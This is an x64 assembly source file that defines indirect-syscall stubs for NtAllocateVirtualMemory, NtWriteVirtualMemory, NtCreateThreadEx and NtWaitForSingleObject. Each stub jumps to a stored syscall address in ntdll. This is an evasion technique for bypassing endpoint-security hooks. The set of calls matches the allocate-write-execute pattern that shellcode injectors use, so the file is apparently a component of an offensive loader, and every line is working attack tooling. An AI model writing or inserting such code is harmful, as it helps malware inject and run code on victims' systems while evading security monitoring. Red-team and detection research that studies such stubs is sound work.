EXTERN wNtAllocateVirtualMemory:DWORD              
EXTERN sysAddrNtAllocateVirtualMemory:QWORD        

EXTERN wNtWriteVirtualMemory:DWORD               
EXTERN sysAddrNtWriteVirtualMemory:QWORD   

EXTERN wNtCreateThreadEx:DWORD                  
EXTERN sysAddrNtCreateThreadEx:QWORD           

EXTERN wNtWaitForSingleObject:DWORD               
EXTERN sysAddrNtWaitForSingleObject:QWORD          

.CODE  ; Start the code section

; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                              
    mov eax, wNtAllocateVirtualMemory            
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  
NtAllocateVirtualMemory ENDP                        


; Similar procedures for NtWriteVirtualMemory syscalls
NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtWriteVirtualMemory
    jmp QWORD PTR [sysAddrNtWriteVirtualMemory]
NtWriteVirtualMemory ENDP


; Similar procedures for NtCreateThreadEx syscalls
NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, wNtCreateThreadEx
    jmp QWORD PTR [sysAddrNtCreateThreadEx]
NtCreateThreadEx ENDP


; Similar procedures for NtWaitForSingleObject syscalls
NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, wNtWaitForSingleObject
    jmp QWORD PTR [sysAddrNtWaitForSingleObject]
NtWaitForSingleObject ENDP

END  